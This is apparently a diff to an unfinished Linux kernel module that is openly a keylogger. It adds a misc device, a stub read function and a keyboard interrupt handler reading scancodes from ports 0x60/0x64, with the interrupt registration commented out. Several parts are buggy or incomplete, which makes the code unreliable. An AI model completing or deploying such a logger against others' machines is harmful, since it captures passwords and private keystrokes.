@@ -2,6 +2,8 @@
 #include <linux/kernel.h>
 #include <linux/debugfs.h>
 #include <linux/fs.h>
+#include <linux/interrupt.h>
+#include <linux/miscdevice.h>
 
 #define PATH "keylog"
 
@@ -10,8 +12,10 @@ MODULE_AUTHOR("stmartin");
 MODULE_DESCRIPTION("Module keylog");
 
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset);
-struct dentry	*dir_entry, *file_entry;
+static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset);
 
+struct dentry		*dir_entry, *file_entry;
+static unsigned short	kbd_buffer = 0x0000;
 
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
@@ -19,14 +23,26 @@ static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, lof
 	return 1;
 }
 
+static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
+{
+	printk(KERN_INFO "in the read\n");
+	return 1;
+}
+
 static struct file_operations	key_ops = {
 
 	.owner = THIS_MODULE,
 	.write = key_write,
+	.read = key_read
 };
 
+static struct miscdevice	key_dev = {
+	.minor = MISC_DYNAMIC_MINOR,
+        .name = "keylogger",
+        .fops = &key_ops
+};
 
-int		create_dir(void)
+static int		create_dir(void)
 {
 	dir_entry = debugfs_create_dir(PATH, NULL);
 	if (dir_entry == ERR_PTR(-ENODEV))
@@ -43,7 +59,7 @@ int		create_dir(void)
 	return 1;
 }
 
-int		create_file(const char *name, umode_t mode, struct file_operations *fops)
+static int		create_file(const char *name, umode_t mode, struct file_operations *fops)
 {
 	file_entry = debugfs_create_file(name, mode, dir_entry, NULL, fops);
 	if (file_entry == NULL)
@@ -55,7 +71,18 @@ int		create_file(const char *name, umode_t mode, struct file_operations *fops)
 	return 1;
 }
 
-static int	__init keylogger_init(void)
+static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id, struct pt_regs *regs)
+{
+	unsigned char status, scancode;
+
+	status = inb(0x64);
+	scancode = inb(0x60);
+	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
+	//wake_up_interruptible(&kbd_irq_waitq);
+	return IRQ_HANDLED;
+}
+
+static int		__init keylogger_init(void)
 {
 	printk(KERN_INFO "in keylogger init function \n");
 	if (create_dir() != 1)
@@ -63,18 +90,24 @@ static int	__init keylogger_init(void)
 		printk(KERN_INFO "creation directory failed\n");
 		return 0;
 	}
-	if (create_file("keylogs", 0660, &key_ops))
+	if (create_file("keylogs", 0660, &key_ops) != 1)
 	{
 		printk(KERN_INFO "file creation failed \n");
 		return 0;
 	}
+	if (misc_register(&key_dev))
+		return 0;
+	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
+//	request_irq(1, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler);
+
 	return 1;
 }
 
-static void	__exit keylogger_exit(void)
+static void		__exit keylogger_exit(void)
 {
 	printk(KERN_INFO "exit keylogger\n");
 	debugfs_remove_recursive(dir_entry);
+	misc_deregister(&key_dev);
 }
 
 module_init(keylogger_init);
